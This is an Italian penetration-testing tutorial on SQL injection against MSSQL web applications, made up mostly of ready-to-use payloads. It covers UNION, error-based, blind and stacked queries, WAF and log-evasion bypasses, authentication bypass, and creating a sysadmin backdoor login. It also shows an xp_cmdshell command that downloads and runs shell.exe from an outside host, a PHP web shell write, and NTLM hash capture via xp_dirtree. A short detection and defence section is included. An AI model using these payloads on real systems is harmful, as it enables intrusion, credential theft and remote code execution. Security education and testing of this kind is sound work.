---
title: 'SQL Injection MSSQL: UNION, Blind, Stacked, RCE, Payload'
slug: sql-injection-mssql
description: 'Pentest SQL Injection MSSQL: identifica apici, sfrutta UNION/blind/time-based/stacked/error-based, bypassa WAF, RCE via xp_cmdshell, hash NTLM, linked server.'
image: /sql-injection-mssql-attack.webp
draft: false
date: 2026-07-11T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - sql-injection
  - mssql
featured: true
---

# SQL Injection MSSQL: Identificazione, UNION, Blind, Time-Based, Stacked Query, RCE e Payload

Una web app che usa MSSQL come backend e non sanifica l'input è una porta diretta verso il database — e, con la sintassi giusta, spesso anche verso il sistema operativo sottostante. Questa guida copre solo il lato web (parametri, form, header HTTP): per l'accesso diretto all'istanza via porta 1433 trovi la guida dedicata su [Pentesting MSSQL sulla porta 1433](https://hackita.it/articoli/porta-1433-mssql/).

**Cosa imparerai:**

* Come capire se un parametro è vulnerabile con apici e virgolette
* La sintassi corretta di commenti, terminatori e null byte su MSSQL
* Come confermare che il DBMS è proprio MSSQL e non un altro
* Tutte le varianti di payload da provare quando quello base non funziona
* Come dumpare dati con UNION, error-based, blind e stacked query
* Come bypassare filtri e WAF (HPP, encoding, JSON, header)
* Come arrivare a RCE con xp\_cmdshell partendo da una SQLi web
* Come rilevare e difendersi da questi attacchi (lato blue team)

**Prerequisiti:**

| Cosa serve                                                         | Perché                                     |
| ------------------------------------------------------------------ | ------------------------------------------ |
| Un proxy come [Burp Suite](https://hackita.it/articoli/burp-suite) | Per intercettare e modificare le richieste |
| Basi di SQL                                                        | Per capire cosa stai iniettando e perché   |
| Ambiente di test autorizzato (HTB, lab, CTF)                       | Ogni tecnica qui è didattica               |

***

## 1. Identificare il Punto Vulnerabile {#1}

Il parametro web finisce dentro una query lato server, tipo:

```sql
SELECT * FROM products WHERE name = 'INPUT'
```

Per capire se è vulnerabile, prova a rompere la sintassi con caratteri speciali e osserva la risposta.

Questo è esattamente ciò che succede a livello di codice quando l'input non è sanificato:

![Diagramma: come un apice rompe la struttura della query SQL](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MDAiIGhlaWdodD0iMzYwIiB2aWV3Qm94PSIwIDAgOTAwIDM2MCIgZm9udC1mYW1pbHk9IkNvbnNvbGFzLCBNZW5sbywgbW9ub3NwYWNlIj4KICA8cmVjdCB3aWR0aD0iOTAwIiBoZWlnaHQ9IjM2MCIgZmlsbD0iIzExMTExMSIvPgoKICA8dGV4dCB4PSIzMCIgeT0iNDAiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSJib2xkIj5RdWVyeSBhdHRlc2EgZGFsbCdhcHBsaWNhemlvbmU8L3RleHQ+CiAgPHJlY3QgeD0iMzAiIHk9IjU1IiB3aWR0aD0iODQwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMWExYTFhIiBzdHJva2U9IiNkYzI2MjYiIHN0cm9rZS13aWR0aD0iMSIvPgogIDx0ZXh0IHg9IjQ1IiB5PSI4MCIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxNSI+U0VMRUNUICogRlJPTSBwcm9kdWN0cyBXSEVSRSBuYW1lID0gJzx0c3BhbiBmaWxsPSIjZGMyNjI2IiBmb250LXdlaWdodD0iYm9sZCI+SU5QVVQ8L3RzcGFuPic8L3RleHQ+CgogIDx0ZXh0IHg9IjMwIiB5PSIxNDAiIGZpbGw9IiNmZmZmZmYiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSJib2xkIj5TZSBJTlBVVCA9ICcgVU5JT04gU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gdXNlcnMtLSAtPC90ZXh0PgogIDxyZWN0IHg9IjMwIiB5PSIxNTUiIHdpZHRoPSI4NDAiIGhlaWdodD0iNDUiIGZpbGw9IiMxYTFhMWEiIHN0cm9rZT0iI2RjMjYyNiIgc3Ryb2tlLXdpZHRoPSIxIi8+CiAgPHRleHQgeD0iNDUiIHk9IjE4MyIgZm9udC1zaXplPSIxNCI+CiAgICA8dHNwYW4gZmlsbD0iI2ZmZmZmZiI+U0VMRUNUICogRlJPTSBwcm9kdWN0cyBXSEVSRSBuYW1lID0gJzwvdHNwYW4+PHRzcGFuIGZpbGw9IiNkYzI2MjYiIGZvbnQtd2VpZ2h0PSJib2xkIj4nIFVOSU9OIFNFTEVDVCB1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzPC90c3Bhbj48dHNwYW4gZmlsbD0iIzc3Nzc3NyI+LS0gLSc8L3RzcGFuPgogIDwvdGV4dD4KCiAgPGxpbmUgeDE9Ijc2IiB5MT0iMjA1IiB4Mj0iNzYiIHkyPSIyMjUiIHN0cm9rZT0iI2RjMjYyNiIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgPHRleHQgeD0iMzAiIHk9IjI0MCIgZmlsbD0iI2RjMjYyNiIgZm9udC1zaXplPSIxMyI+bCdhcGljZSBjaGl1ZGUgbGEgc3RyaW5nYSBpbiBhbnRpY2lwbzwvdGV4dD4KCiAgPGxpbmUgeDE9IjQ3MCIgeTE9IjIwNSIgeDI9IjQ3MCIgeTI9IjIyNSIgc3Ryb2tlPSIjZGMyNjI2IiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSIzMzAiIHk9IjI0MCIgZmlsbD0iI2RjMjYyNiIgZm9udC1zaXplPSIxMyI+bnVvdmEgcXVlcnkgaW5pZXR0YXRhIGRhbGwnYXR0YWNjYW50ZTwvdGV4dD4KCiAgPGxpbmUgeDE9Ijc5MCIgeTE9IjIwNSIgeDI9Ijc5MCIgeTI9IjIyNSIgc3Ryb2tlPSIjNzc3Nzc3IiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSI3MDAiIHk9IjI0MCIgZmlsbD0iIzc3Nzc3NyIgZm9udC1zaXplPSIxMyI+Y29tbWVudGF0bywgaWdub3JhdG88L3RleHQ+CgogIDxyZWN0IHg9IjMwIiB5PSIyNzAiIHdpZHRoPSI4NDAiIGhlaWdodD0iNzAiIGZpbGw9IiMxYTFhMWEiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIxIi8+CiAgPHRleHQgeD0iNDUiIHk9IjI5NSIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiPlJpc3VsdGF0bzo8L3RleHQ+CiAgPHRleHQgeD0iNDUiIHk9IjMxOCIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMyI+bCdhcHAgZXNlZ3VlIGR1ZSBTRUxFQ1QgaW52ZWNlIGRpIHVuYTogcXVlbGxhIG9yaWdpbmFsZSAoY2hlIG5vbiB0cm92YSBudWxsYSw8L3RleHQ+CiAgPHRleHQgeD0iNDUiIHk9IjMzNiIgZmlsbD0iI2ZmZmZmZiIgZm9udC1zaXplPSIxMyI+c3RyaW5nYSB2dW90YSkgZSBxdWVsbGEgZGVsbCdhdHRhY2NhbnRlLCBjaGUgb3JhIG1vc3RyYSB1c2VybmFtZSBlIHBhc3N3b3JkIG5lbGxhIHBhZ2luYS48L3RleHQ+Cjwvc3ZnPgo=)

### Test iniziale

```
'
''
"
' OR '1'='1
' AND '1'='1
' AND '1'='2
1 AND 1=1
1 AND 1=2
```

### Interpretare la risposta

| Cosa vedi                                                          | Significato                                                              |
| ------------------------------------------------------------------ | ------------------------------------------------------------------------ |
| Errore SQL (`Incorrect syntax near...`, `Unclosed quotation mark`) | Injection confermata — error-based possibile                             |
| Pagina diversa tra `AND 1=1` e `AND 1=2`                           | Boolean blind confermata                                                 |
| Ritardo 5+ secondi con `WAITFOR DELAY`                             | Time-based blind confermata                                              |
| Nessuna differenza con nessun payload                              | WAF attivo o parametro non iniettabile                                   |
| Errore HTTP 500 generico                                           | Injection probabile, ma i dettagli sono nascosti (error handling attivo) |

### Messaggi di errore tipici di MSSQL

Se l'app espone gli errori del database (spesso in dev o con debug attivo), questi testi confermano MSSQL:

```
Incorrect syntax near '...'.
Unclosed quotation mark after the character string '...'.
The conversion of the varchar value '...' to data type int resulted in an out-of-range value.
```

### Identificare il contesto del parametro

```
Prova:  '    → errore syntax
Prova:  ''   → errore sparisce → contesto stringa semplice
Prova:  ')   → errore sparisce → contesto con parentesi
Prova:  '))  → errore sparisce → doppia parentesi
Prova:  1    → nessun errore  → intero (nessun apice)
```

***

## 2. La Sintassi: Apici, Commenti e Terminatori {#2}

### Il singolo apice `'`

Iniettando `'` chiudi la stringa prima del tempo → errore SQL → injection confermata.

### I commenti: `--`, `-- -`, `--+`

Dopo il payload devi commentare il resto della query originale. `--` in SQL richiede tecnicamente uno spazio dopo per essere valido (`-- `).

| Commento | Funzionamento                          | Quando usarlo                         |
| -------- | -------------------------------------- | ------------------------------------- |
| `--`     | Funziona su MSSQL anche senza spazio   | Default                               |
| `-- -`   | `--` + spazio + `-` → spazio garantito | Quando `--` viene troncato o filtrato |
| `--+`    | In URL `+` = spazio → diventa `-- `    | Parametri GET in URL                  |
| `/* */`  | Commento inline (C-style)              | Bypass filtri su spazi e keyword      |
| `;%00`   | Null byte come terminatore             | Alcuni parser tagliano la query lì    |

**Regola pratica:** usa `-- -` nei body POST via Burp, `--+` nei parametri GET URL.

### Il punto e virgola `;`

Chiude lo statement corrente e apre il successivo. Necessario per stacked query e stored procedure:

```
'                   → chiude la stringa
; payload           → nuovo statement
;-- -               → chiude il nuovo statement e commenta il resto
```

Struttura corretta per stacked query via web:

```
'; EXEC xp_cmdshell 'whoami';-- -
^^                           ^^
chiude stringa    chiude statement + commenta
```

### AND vs OR

| Operatore       | Effetto                      | Quando usarlo                               |
| --------------- | ---------------------------- | ------------------------------------------- |
| `' AND 1=1-- -` | Mantiene il filtro originale | Boolean blind, UNION                        |
| `' AND 1=2-- -` | Forza FALSE                  | Verifica discriminatore blind               |
| `' OR 1=1-- -`  | Bypassa tutti i filtri       | Authentication bypass — genera molto rumore |

***

## 3. Fingerprinting: Conferma che è MSSQL {#3}

Prima di usare payload MSSQL-specifici, identifica il DBMS — sbagliare qui ti fa perdere tempo con sintassi sbagliata.

### Time-based (il metodo più affidabile)

Ogni DB ha la sua funzione di delay — è l'unico test che non dipende da messaggi di errore visibili:

```sql
-- MSSQL → WAITFOR DELAY (esclusivo, non esiste su nessun altro DBMS)
'; WAITFOR DELAY '0:0:5';-- -

-- MySQL/MariaDB → SLEEP
' AND SLEEP(5)-- -

-- PostgreSQL → pg_sleep
' AND pg_sleep(5)>0-- -

-- Oracle → DBMS_PIPE
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
```

Se con `WAITFOR DELAY` il server risponde dopo 5 secondi → **sei su MSSQL**, stop.

### Conferma con funzioni esclusive di MSSQL

```sql
' AND @@CONNECTIONS>0-- -                          → solo MSSQL
' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)-- -    → solo MSSQL
' AND 1=CONVERT(int,@@VERSION)-- -                 → errore con versione MSSQL nel testo
' AND @@VERSION LIKE '%Microsoft SQL Server%'-- -  → TRUE solo su MSSQL
```

***

## 4. Database di Default da Ignorare {#4}

Quando enumeri i database durante una SQLi, questi sono sempre presenti a prescindere dall'applicazione — non perdere tempo a cercare dati qui dentro.

| Nome        | Presente su                           |
| ----------- | ------------------------------------- |
| `master`    | Tutte le versioni                     |
| `model`     | Tutte le versioni                     |
| `msdb`      | Tutte le versioni                     |
| `tempdb`    | Tutte le versioni                     |
| `northwind` | Tutte le versioni (DB dimostrativo)   |
| `pubs`      | Solo versioni precedenti a MSSQL 2005 |

***

## 5. Varianti da Provare Quando il Payload Non Funziona {#5}

In un test reale `' UNION SELECT 1,2,3-- -` quasi mai funziona al primo tentativo. Segui questo ordine:

```
1. Identifica il contesto del parametro (sezione 1)
2. Prova la variante di commento giusta (sezione 2)
3. Prova UNION SELECT
4. Se UNION non va → prova error-based o blind
5. Se stacked funziona → prova xp_dirtree e poi xp_cmdshell
```

### Varianti per contesto

Per **stringa semplice**:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3--+
' UNION SELECT NULL,NULL,NULL-- -
' UNION ALL SELECT 1,2,3-- -
```

Per **parametro con parentesi**:

```sql
') UNION SELECT 1,2,3-- -
')) UNION SELECT 1,2,3-- -
```

Per **stacked queries** (nota il `;` finale prima del commento):

```sql
'; SELECT 1;-- -
'; WAITFOR DELAY '0:0:5';-- -
```

Per **parametro numerico** (nessun apice):

```sql
1 UNION SELECT 1,2,3-- -
1 AND 1=1-- -
1; WAITFOR DELAY '0:0:5';-- -
```

### Bypass spazi e keyword filtrate da un WAF

```sql
-- Commento inline al posto degli spazi
'/**/UNION/**/SELECT/**/1,2,3-- -

-- URL encoding (GET)
'+UNION+SELECT+1,2,3-- -
'%09UNION%09SELECT%091,2,3-- -      (TAB)
'%0aUNION%0aSELECT%0a1,2,3-- -     (newline)
'%a0UNION%a0SELECT%a01,2,3-- -      (non-breaking space, MSSQL la tratta come spazio)

-- Case mixing
' UnIoN SeLeCt 1,2,3-- -

-- Varianti UNION (bypass regex su "union select")
' UNION ALL SELECT 1,2,3-- -
' UNION DISTINCT SELECT 1,2,3-- -
' UNION/**/SELECT 1,2,3-- -

-- Spezza la keyword con concatenazione dinamica (bypass blacklist testuale)
'; DECLARE @q NVARCHAR(100)='UNI'+'ON SEL'+'ECT 1,2,3';EXEC(@q);-- -
```

MSSQL considera spazio solo i caratteri ASCII 0x01–0x1F e 0x20 — a differenza di MySQL, non ha whitespace "esotici" aggiuntivi, quindi i bypass basati su encoding funzionano in un set più ristretto di varianti.

### Tecniche avanzate di bypass WAF

**HTTP Parameter Pollution (HPP):** se l'app concatena due parametri nella stessa query, spezza il payload tra i due — il WAF ispeziona ogni parametro singolarmente:

```
?year=1 UNION SELECT /*&month=*/ 1,2,3-- -
```

**JSON-based bypass:** molti WAF non ispezionano la sintassi JSON nelle query SQL. MSSQL supporta JSON dal 2016:

```sql
' AND JSON_VALUE('{"a":1}','$.a')=1 UNION SELECT 1,2,3-- -
```

**Injection via header HTTP:** se l'app logga o usa header in query SQL, spesso i WAF li ispezionano meno del body:

```
X-Forwarded-For: 1' UNION SELECT 1,2,3-- -
User-Agent: ' UNION SELECT 1,2,3-- -
```

**sqlmap — tamper per MSSQL con WAF:**

```bash
sqlmap -r req.txt -p id --dbms=mssql --tamper=space2mssqlblank,charencode,randomcase
```

### Bypass filtri sugli apici: encoding esadecimale

Se il WAF blocca specificamente il carattere `'`, puoi evitarlo del tutto passando stringhe come literal esadecimali — MSSQL le converte automaticamente se precedute da `0x`:

```sql
-- Invece di 'admin' scrivi il suo valore esadecimale
1; EXEC(0x73656C65637420404076657273696F6E)-- -
```

Utile solo nei contesti dove il parametro accetta un valore intero o dove costruisci la query dinamicamente con `EXEC()` — nel contesto stringa classico (`WHERE name = 'INPUT'`) non sostituisce l'apice di chiusura, che resta comunque necessario.

***

## 6. UNION-Based: Dump Visivo dei Dati {#6}

### Trova il numero di colonne — tutte le varianti

```sql
-- ORDER BY, incrementale (errore quando superi le colonne reali)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
...
' ORDER BY 100-- -

-- ORDER BY con parentesi (contesto diverso)
') ORDER BY 1-- -

-- ORDER BY numerico (parametro senza apici)
1 ORDER BY 1-- -

-- UNION NULL, incrementale (type-safe, funziona sempre anche senza errori visibili)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -

-- Con interi, se le colonne accettano tipi numerici
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
```

**Come interpretare ORDER BY:** se `ORDER BY 6` non dà errore e `ORDER BY 7` genera `Invalid column index` (o simile) → la query ha esattamente **6 colonne**. La tua UNION deve avere lo stesso numero di valori, altrimenti l'errore è `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists`.

### Trova la colonna visibile a schermo

```sql
' UNION SELECT 'hackita',NULL,NULL-- -
' UNION SELECT NULL,'hackita',NULL-- -
```

Quando "hackita" appare nella pagina → quella è la colonna che usi per estrarre i dati.

### Flusso pratico: da zero al dump

Colonna 2 confermata, 6 colonne totali.

```sql
-- Database
' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM master..sysdatabases-- -

-- Tabelle del DB trovato
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.tables-- -

-- Colonne della tabella
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.columns WHERE table_name='users'-- -

-- Dati, tutti concatenati in un blocco unico
' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM NomeDB..users FOR XML PATH('')),NULL,NULL,NULL,NULL-- -
```

> **Errore tipico:** scrivere `SELECT name, FROM tabella` con la virgola prima di FROM. La struttura corretta è sempre `SELECT val1, val2, val3 FROM tabella` — la FROM viene dopo tutti i valori, mai in mezzo.

***

## 7. Error-Based: Fai Parlare gli Errori {#7}

Utile quando il risultato della query non viene mai mostrato a schermo, ma gli errori sì.

```sql
-- CONVERT (il più usato)
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))-- -

-- CAST
' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -

-- Tutti i DB in una riga
' AND 1=CAST((SELECT (SELECT name+' ' FROM master..sysdatabases FOR XML PATH(''))) AS int)-- -
```

L'errore restituito conterrà i tuoi dati:

```
Conversion failed when converting the varchar value 'master tempdb model msdb' to data type int.
```

### ORDER BY injection

Quando il punto iniettabile è nella clausola `ORDER BY`, UNION non funziona — usa error-based:

```sql
ORDER BY 1,CONVERT(int,@@VERSION)-- -
ORDER BY (SELECT TOP 1 name FROM master..sysdatabases)-- -
```

***

## 8. Blind SQL Injection: Boolean e Time-Based {#8}

### Boolean Blind

Pagina che non mostra dati SQL ma cambia comportamento tra TRUE e FALSE.

```sql
-- Conferma discriminatore
' AND 1=1-- -    → pagina normale (TRUE)
' AND 1=2-- -    → pagina diversa (FALSE)

-- Lunghezza del dato
' AND LEN((SELECT TOP 1 name FROM master..sysdatabases))=6-- -

-- Carattere per carattere
' AND SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1)='m'-- -

-- Con ASCII + binary search (più veloce in automazione)
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))>64-- -

-- Dump password
' AND SUBSTRING((SELECT TOP 1 password FROM NomeDB..users),1,1)='a'-- -
```

### Time-Based Blind

Quando anche il comportamento della pagina è identico in ogni caso — l'unico segnale è il tempo di risposta.

```sql
-- Conferma — varianti da provare in base al contesto
'; IF(1=1) WAITFOR DELAY '0:0:5';-- -
ProductID=1'; WAITFOR DELAY '0:0:5';-- -
ProductID=1); WAITFOR DELAY '0:0:5';-- -

-- Estrai carattere per carattere
'; IF(ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))=109) WAITFOR DELAY '0:0:5';-- -

-- Verifica sysadmin
'; IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5';-- -
```

Per automatizzare usa [sqlmap](https://hackita.it/articoli/sqlmap) con `--technique=B --time-sec=5 --threads=1` — più thread con time-based generano falsi positivi.

***

## 9. Stacked Queries: Statement Multipli {#9}

MSSQL supporta nativamente più statement separati da `;` nella stessa richiesta — è uno dei motivi per cui è più pericoloso di MySQL su questo fronte (MySQL di solito blocca le stacked query lato driver).

```sql
-- Conferma (nota il ; finale prima del commento)
'; SELECT 1;-- -

-- Bypass blacklist testuale con variabile
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami';-- -

-- Scrivi su tabella temporanea poi leggi con UNION
'; CREATE TABLE #tmp (data VARCHAR(1000)); INSERT INTO #tmp SELECT name FROM master..sysdatabases;-- -
' UNION SELECT NULL,(SELECT TOP 1 data FROM #tmp),NULL-- -

-- Modifica diretta di dati (es. reset password admin)
'; UPDATE users SET password='hackita123' WHERE username='admin';-- -

-- Se sei sysadmin, crea un login con privilegi elevati direttamente dalla injection
'; CREATE LOGIN backdoor WITH PASSWORD='P@ssw0rd123!'; EXEC sp_addsrvrolemember 'backdoor','sysadmin';-- -
```

***

## 10. Authentication Bypass {#10}

Se il parametro iniettabile è nel form di login, puoi bypassare l'autenticazione senza conoscere la password:

```sql
' OR '1'='1
' OR 1=1-- -
admin'-- -
admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'-- -
```

L'ultimo esempio inietta anche un hash MD5 noto (di `P@ssw0rd`) al posto della password — funziona solo se l'app confronta un MD5 semplice senza salt, cosa ormai rara nel 2026.

> **Attenzione:** `' OR 1=1--` fa matchare la query con ogni riga della tabella. Se l'app si aspetta un solo risultato, spesso genera un errore lato server invece di farti loggare — in quel caso prova `admin'--` per autenticarti come un utente specifico senza conoscerne la password.

***

## 10b. Impersonare Altri Utenti via SQLi {#10b}

Se le stacked query funzionano, puoi cambiare il contesto di sicurezza della connessione senza conoscere nessuna password — utile quando l'utente della connessione web ha pochi permessi ma esiste un login più privilegiato sullo stesso server.

```sql
-- Chi puoi impersonare? (richiede che qualcuno ti abbia dato IMPERSONATE)
'; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';-- -

-- Impersona un login (server-level)
'; EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER;-- -

-- Impersona un utente (database-level, permesso IMPERSONATE più comune qui)
'; EXECUTE AS USER='dbo'; SELECT USER_NAME();-- -

-- Torna al contesto originale
'; REVERT;-- -
```

Da una SQLi web questi comandi non restituiscono output diretto (a meno che tu non li combini con UNION o error-based per leggere `SYSTEM_USER`) — servono soprattutto per eseguire i comandi *successivi* nella stessa sessione stacked con i privilegi più alti dell'utente impersonato.

***

## 11. Second-Order SQL Injection {#11}

Un payload può essere salvato innocuamente (es. in un campo profilo o commento) e poi eseguito in un secondo momento, quando quel dato viene riutilizzato in un'altra query senza essere ri-sanificato:

```
1. L'utente si registra con username: admin'--
2. L'app salva la stringa così com'è nel database
3. In un secondo momento l'app costruisce una query tipo:
   SELECT * FROM users WHERE username = 'admin'--' AND ...
4. Il commento `--` tagliato dal valore salvato altera la query originale
```

Va cercato ovunque un input salvato venga poi riutilizzato in una query diversa da quella di inserimento — profili utente, commenti, nomi file.

***

## 12. Lettura e Scrittura File via SQLi {#12}

```sql
-- Lettura (richiede ADMINISTER BULK OPERATIONS)
-1 UNION SELECT NULL,(SELECT x FROM OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),NULL-- -

-- Scrittura, se l'app ha una stored procedure custom per farlo
'; EXEC spWriteStringToFile '<?php echo shell_exec($_GET["c"]);?>','C:\inetpub\wwwroot\','shell.php';-- -
```

La scrittura dipende da una stored procedure specifica dell'applicazione — non è nativa di MSSQL, cercala prima nell'enumerazione delle procedure custom.

***

## 13. RCE con xp\_cmdshell {#13}

Se le stacked query funzionano e sei sysadmin, puoi abilitare ed eseguire comandi OS direttamente dalla SQLi:

```sql
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
'; EXEC master..xp_cmdshell 'whoami';-- -
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.123/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe';-- -
```

Per l'elenco completo di metodi alternativi (OLE Automation, Python, CLR) quando xp\_cmdshell è troppo rumoroso o disabilitato, vedi la sezione dedicata nella [guida MSSQL porta 1433](https://hackita.it/articoli/porta-1433-mssql/).

***

## 14. Hash Capture e Linked Server via SQLi {#14}

Anche senza sysadmin, una stacked query può forzare il servizio MSSQL a esporre l'hash NTLM del suo service account:

```sql
'; EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';-- -
```

Cattura l'hash con [Responder](https://hackita.it/articoli/responder) in ascolto (`sudo responder -I tun0 -v`), poi craccalo con [hashcat](https://hackita.it/articoli/hashcat) in modalità 5600.

Se il firewall blocca SMB in uscita, usa l'esfiltrazione via DNS al posto di xp\_dirtree, e se l'istanza ha linked server configurati puoi attraversarli con `EXECUTE ... AT` — entrambe le tecniche, con tutti i dettagli, sono nella [guida MSSQL porta 1433](https://hackita.it/articoli/porta-1433-mssql/), perché una volta dentro il DB il resto dell'attacco non dipende più dal fatto che tu ci sia arrivato via web o via connessione diretta.

### Dumpare tutte le password, non solo la prima

Gli esempi con `TOP 1` nelle sezioni precedenti servono per confermare la tecnica — in un dump reale vuoi tutte le righe, non solo la prima. Con UNION è già automatico (`SELECT username,password FROM users` restituisce tutte le righe); con error-based o blind, dove il canale d'uscita è limitato a un valore alla volta, concatena tutto in un'unica stringa:

```sql
-- Tutti gli utenti e le password concatenati in un blocco unico (via UNION, XML PATH)
' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM users FOR XML PATH(''))-- -

-- Se hai sysadmin, dump diretto degli hash di sistema invece dei dati applicativi
' UNION SELECT NULL,(SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash)+' | ' FROM master.sys.sql_logins FOR XML PATH(''))-- -
```

Il secondo payload ti dà gli hash dei login SQL Server stessi (non gli utenti dell'app) — utili per movimento laterale se riusati altrove. Il formato dell'hash cambia in base alla versione: vedi la tabella completa modes hashcat (131/132/1731) nella [guida porta 1433](https://hackita.it/articoli/porta-1433-mssql/).

### Enumerare utenti di dominio via SID (senza xp\_cmdshell)

Se il server è joined ad Active Directory, puoi enumerare gli utenti del dominio interrogando solo funzioni SQL — senza bisogno di sysadmin né di xp\_cmdshell:

```sql
-- 1. Ottieni il nome del dominio
' UNION SELECT NULL,DEFAULT_DOMAIN()-- -

-- 2. Ottieni il SID di un account noto (es. Administrator) in formato esadecimale
' UNION SELECT NULL,master.dbo.fn_varbintohexstr(SUSER_SID('DOMINIO\Administrator'))-- -
```

Il risultato è tipo `0x0105000000000005150000...0000f401`. Gli ultimi 4 byte (`f401` = 500 in little endian) sono il **RID** (Relative ID) dell'utente — `500` è sempre l'Administrator. Tutto il resto della stringa è il SID del dominio, costante per ogni account.

```sql
-- 3. Ricostruisci un SID con RID diverso e risolvilo a un nome utente
' UNION SELECT NULL,SUSER_SNAME(SID_BINARY(N'S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-1000'))-- -
```

Iterando il RID da 1000 in su (i primi ID utente "regolari", non di sistema) ottieni progressivamente tutti gli username del dominio — la stessa logica RID-brute usata da `nxc mssql --rid-brute`, ma eseguita interamente tramite SQL injection, senza toccare SMB. Ogni username trovato è materiale pronto per password spray o per [Kerberoasting/AS-REP roasting](https://hackita.it/articoli/kerberos).

***

## 15. OPSEC: Nascondere il Payload dai Log {#15}

Aggiungendo `sp_password` in coda a una query, SQL Server sostituisce automaticamente il testo nei log con un placeholder generico, pensato per evitare che password finiscano nei log in chiaro:

```sql
' AND 1=1--sp_password
```

Nei log del server comparirà solo:

```
'sp_password' was found in the text of this event.
The text has been replaced with this comment for security reasons.
```

Un blue team dovrebbe quindi diffidare di eventi con testo oscurato senza una password apparente nella query originale — è un indicatore, non un errore innocuo.

***

## 16. Detection e Difesa {#16}

| Attacco                            | Come rilevarlo                                                                    | Come mitigarlo                                                                                                                |
| ---------------------------------- | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Test con apici/errori di sintassi  | Errori SQL ripetuti nei log applicativi da uno stesso IP                          | Query parametrizzate (prepared statement) — l'unica difesa che funziona davvero                                               |
| UNION-based                        | Query con numero di colonne anomalo o `UNION` nei log WAF                         | Validazione input, allow-list sui parametri numerici/enum                                                                     |
| Time-based blind                   | Richieste con tempo di risposta anomalo e ripetuto                                | Rate limiting, alert su pattern di richieste identiche a intervalli                                                           |
| Stacked query                      | Query con `;` multipli nei log, specialmente verso `xp_cmdshell` o `sp_configure` | Disabilita le stacked query lato driver se il framework lo consente, principio del minimo privilegio sull'account applicativo |
| `sp_password` per nascondere i log | Eventi con testo oscurato senza contesto password                                 | Correla con altri segnali (IP, user-agent, frequenza) invece di fidarti solo del testo del log                                |
| xp\_dirtree / hash capture         | Traffico SMB in uscita anomalo                                                    | Blocca SMB in uscita, disabilita `xp_dirtree` se non necessario                                                               |

La difesa di fondo resta una sola: **query parametrizzate ovunque**, mai concatenazione di stringhe con input utente. Tutto il resto (WAF, allow-list, minimo privilegio) è un livello aggiuntivo, non un sostituto.

**Vulnerabile (concatenazione diretta):**

```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**Sicuro (query parametrizzata):**

```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

Con la seconda versione, il driver invia il valore separatamente dalla struttura della query — un apice nell'input resta un semplice carattere, non riesce mai a "uscire" dal contesto stringa.

***

## 17. Troubleshooting {#17}

| Problema                            | Causa                                      | Soluzione                                                       |
| ----------------------------------- | ------------------------------------------ | --------------------------------------------------------------- |
| Errore con `'` ma non `''`          | Stringa confermata                         | Prova `'-- -`, `')-- -`, `'))-- -`                              |
| UNION funziona ma nessun output     | Colonna visibile sbagliata                 | Prova `'hackita'` in ogni posizione                             |
